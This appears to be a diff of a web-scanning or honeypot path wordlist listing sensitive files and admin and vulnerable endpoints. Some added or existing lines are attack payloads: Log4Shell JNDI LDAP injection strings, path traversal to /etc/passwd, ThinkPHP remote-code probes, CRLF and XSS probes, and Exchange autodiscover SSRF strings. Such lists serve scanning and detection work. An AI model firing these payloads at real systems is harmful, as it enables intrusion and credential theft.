@@ -1,6 +1,9 @@
 !.gitignore
 !.htaccess
 !.htpasswd
+$%7Bjndi:ldap://127.0.0.1/foo%7D
+$%7Bjndi:ldaps://127.0.0.1/foo%7D?${jndi:ldaps://127.0.0.1/b}=${jndi:ldaps://127.0.0.1/b}
+${jndi:ldap://127.0.0.1:1389/Exploit}
 %0ASet-Cookie:crlfinjection=crlfinjection
 %20../web-inf/web.xml
 %2256danager/
@@ -571,8 +574,9 @@
 ?s=foo
 ?s={search_term_string}
 ?static=1&order=asc
-?wptouch_switch=desktop&redirect=https://example.com/
+?wptouch_switch=desktop&redirect=https://127.0.0.1/
 ?wsdl
+?x=${jndi:ldap://127.0.0.1/foo}
 ?{alert(1)}
 ADSearch.cc?methodToCall=search
 AUPv
@@ -981,6 +985,7 @@ STORAGE
 SVN/
 SWIj
 SYSTEM
+Sah@
 SasInOut/EditFluxDates/
 Scheduler
 Scripts/common.js
@@ -1160,6 +1165,7 @@ _my_sql_tool_/import.php
 _nodes
 _notes/dwsync.xml
 _novo/composer.lock
+_nuxt/155eb85.js
 _nuxt/8a8f6ee.js
 _old
 _pHpMyAdMiN/
@@ -1372,6 +1378,7 @@ admin/ajax.php?module=recordings
 admin/assets/Xiii.php?yokyok=cat+Xiii.php
 admin/assets/config.all.php?
 admin/assets/config.all.php?x
+admin/assets/js/views/login.js
 admin/backup/
 admin/backups/
 admin/bootstrap.inc.php?mgp=danc3Uf%40t
@@ -1413,6 +1420,7 @@ admin/helpers/config.all.php?
 admin/helpers/config.all.php?x
 admin/i18n/config.all.php?
 admin/i18n/config.all.php?x
+admin/i18n/readme.txt
 admin/images/config.all.php?
 admin/images/config.all.php?x
 admin/import.php
@@ -1553,6 +1561,7 @@ administrator/language/en-GB/install.xml
 administrator/logs
 administrator/manifests/files/joomla.xml
 administrator/phpMyAdmin/
+administrator/phpMyAdmin/index.php?lang=en
 administrator/phpmyadmin/
 administrator/pma/
 administrator/web/
@@ -1636,6 +1645,7 @@ api/application.wadl
 api/apps
 api/apps/config
 api/batch
+api/blog/5e09fe7d-84f5-4630-90c6-c0a838627227
 api/bong88-links
 api/cloud
 api/common/getConfig
@@ -1859,6 +1869,7 @@ apply_sec.cgi
 apps/.env
 apps/frontend/config/app.yml
 apps/frontend/config/databases.yml
+apps/index/2c36957bde18fc1a/
 appserv.php
 appspec.yml
 appxz/index.html
@@ -1919,6 +1930,7 @@ auth.inc
 auth.php
 auth/
 auth/.env
+auth/basic/getAppInitConfig
 auth/index.php
 auth/login
 auth/login.jsp
@@ -1947,10 +1959,9 @@ autoconfig
 autodiscover
 autodiscover/autodiscover.json/v1.0/20HyDRC7xFOr7Z0Low9naxCrLaS@google.com?Protocol=Autodiscoverv1
 autodiscover/autodiscover.json?@127.0.0.1/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@127.0.0.1
-autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp
-autodiscover/autodiscover.json?@google.com/owa/?&Email=autodiscover/autodiscover.json%3F@1337.com
-autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
-autodiscover/autodiscover.json?a=a@edu.edu/ews/exchange.asmx
+autodiscover/autodiscover.json?@127.0.0.1/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp
+autodiscover/autodiscover.json?@127.0.0.1/owa/?&Email=autodiscover/autodiscover.json%3F@1337.com
+autodiscover/autodiscover.json?@google.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
 autodiscover/autodiscover.json?a=a@google.com/ews/exchange.asmx
 autoprovision/
 aux
@@ -2919,6 +2930,7 @@ dfshealth.jsp
 dfsnodelist.jsp?whatNodes=DEAD
 dfsnodelist.jsp?whatNodes=LIVE
 dialin/
+digit/app/download/list
 digitalisation/contrat/envoi
 digitalisation/contrat/suivi
 digitalisation/enseigne/edit
@@ -3249,6 +3261,7 @@ fetchUsersDetails
 ff/css/cssy.css
 ffftp.ini
 fgdfkgjhsf.php
+file-sync
 file.php
 file.sql
 file=C:%5CWindows%5Cwin.ini
@@ -3447,6 +3460,7 @@ home.zip
 home/
 home/GetQrCodeInfo
 home/help
+home/info?lang=3
 home/info?lang=6&needAuth=false
 home/loadmymanager
 home/login/login_index.html
@@ -3735,6 +3749,7 @@ izom.php
 jars
 java.php
 java_script/member/template_1/keynum.js
+java_script/template_1/common.js
 javascript
 javascript/
 javascript/jquery-ui/
@@ -4003,6 +4018,7 @@ log/production.log
 log/server.log
 log/test.log
 log/view?filename=passwd&base=..%2Fdummy
+logCenter/basic?p=s&s=d32c34c241
 log_1.txt
 log_errors.txt
 log_status_order.txt
@@ -4213,6 +4229,7 @@ mgmt/tm/util/bash
 mh/phone.do
 mifs/.;/services/LogService
 mini/_gini/lotteryFaceG?_func=GetSoccerHotList&uid=0&token=null&appver=0&os=1&m=16502574&c=0&p=s&s=5c85efb351
+mini/_gini/lotteryFaceG?_func=GetSoccerHotList&uid=0&token=null&appver=0&os=1&m=195536570&c=0&p=s&s=ee27ad726b
 mini/_gini/online
 misc
 misc/
@@ -4434,6 +4451,8 @@ oauth/token
 oci
 octet-stream
 odbc
+odd/app/activity/activity_byType
+odd/app/download/list
 ok
 ol
 old
@@ -5330,6 +5349,8 @@ public/index.php?s=/Index/%09hink%07pp/invokefunction&function=call_user_func_ar
 public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
 public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
 public/js/info.js
+public/plugins/graph/../../../../../../../../etc/hosts
+public/plugins/graph/../../../../../../../../etc/passwd
 public/spaw2/dialogs/dialog.php
 public/spread.php
 public/static/css/denglu.css
@@ -5550,7 +5571,6 @@ resin-doc/viewfile/?file=/WEB-INF/resin-web.xml
 resin-doc/viewfile/?file=index.jsp
 resolve
 resolve?dns=B64
-resolve?name=dnsscan.shadowserver.org&type=A
 resources.xml
 resources/
 resources/css/headernav.css
@@ -5694,9 +5714,11 @@ secure/attachmentzip/
 securite/alternateLogin
 security
 security/components/profile
+securityRealm/user/admin/search/index?q=a
 select
 select/listAllUsers.action
 select/listCurrentUsers.action
+selfservice/
 sellers.json
 send-email/foo
 sendRequest.js
@@ -5848,10 +5870,12 @@ sitemap_index.xml
 sitemaps/.env
 sites
 sites.ini
+sites/.env
 sites/all/libraries/mailchimp/.env
 sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
 sito/wp-includes/wlwmanifest.xml
 sizing
+skidn/app/download/list
 skin/js/common.js
 skin/main/onload.js
 skinny/
@@ -5910,6 +5934,7 @@ sql/phpMyAdmin2/index.php?lang=en
 sql/phpMyAdmin3/
 sql/phpMyAdmin4/
 sql/phpmanager/
+sql/phpmanager/index.php?lang=en
 sql/phpmy-admin/
 sql/phpmy-admin/index.php?lang=en
 sql/phpmyadmin2/
@@ -6029,6 +6054,7 @@ static/js/app.af449aeb.js
 static/js/index.952c9cab.js
 static/js/index.cc66e94a.js
 static/js/main.62b1528b.chunk.js
+static/js/pages-login-login.f70fc6f2.js
 static/js/pages-mine-Login.11481b5e.js
 static/js/user.js
 static/local/img/userCenter/hourlyPrivilege.svg
@@ -6447,6 +6473,7 @@ uploadify/uploadify.swf
 uploads.php
 uploads/
 uploads/.env
+uploads/advertising/26.jpg
 upnp/control/basicevent1
 upstream_conf
 ur-admin.php
@@ -6979,5 +7006,3 @@ zz/address.php?gid=651
 zz2/address.php?gid=651
 zzz.php
 ~install/
-public/plugins/graph/../../../../../../../../etc/passwd
-public/plugins/graph/../../../../../../../../etc/hosts
